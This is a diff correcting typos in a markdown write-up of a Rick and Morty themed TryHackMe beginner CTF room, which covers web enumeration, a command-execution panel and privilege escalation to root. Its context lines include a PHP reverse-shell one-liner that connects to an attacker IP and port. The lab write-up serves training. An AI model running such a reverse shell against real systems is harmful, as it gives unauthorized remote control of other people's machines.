@@ -3,7 +3,7 @@
 ## 📌 Overview
 The description of the room is: ״A Rick and Morty CTF. Help turn Rick back into a human!״
 This room is a beginner-level penetration testing challenge on TryHackMe based on the *Rick and Morty* theme.
-In this room you are asked to explore and enumrate a web-application, gain access to the machine and retrive flags.
+In this room you are asked to explore and enumerate a web-application, gain access to the machine and retrive flags.
 
 The target IP address was: 10.114.180.176
 
@@ -57,7 +57,7 @@ The scan results were successful with:
 
 ---
 
-Using the known Username and the iconic string from robots.txt as a password I got access the the /portal.php which had a "Command Panel" and an "Execute" button.
+Using the known Username and the iconic string from robots.txt as a password I got access to the /portal.php which had a "Command Panel" and an "Execute" button.
 
 <img width="1599" height="1264" alt="Screen Shot 2026-06-24 at 12 12 26 PM" src="https://github.com/user-attachments/assets/f610ed52-7044-4a7c-80b1-ef0466f619b2" />
 
@@ -73,7 +73,7 @@ In order to find what type of shell access I have, I used "echo &0" and discover
 Using this access, I was able to find the current directory contents and by that finding the first ingredient:
 <img width="3196" height="2524" alt="RCEvuln" src="https://github.com/user-attachments/assets/0f36e8a2-8a1c-4b88-ad41-2ce840f4ad44" />
 
-I understood now the clue.txt saying I should look for the other flag and I prefered using the terminal for it so I made a reverse shell command.
+I understood now the clue.txt saying I should look for the other flag and I preferred using the terminal for it so I made a reverse shell command.
 a simple bash one didn't work so I used a php one. the command was:
 
 php -r '$sock=fsockopen("192.168.132.219",9000);exec("sh <&3 >&3 2>&3");'
@@ -117,7 +117,7 @@ Then, looked at the /root directory and found the 3rd file holding the last ingr
 ## Key Takeaways: 🧠
 
 * Importance of thorough web enumeration
-* Impottance of the "Least Privilege" Principle
+* Importance of the "Least Privilege" Principle
 
 ---
 
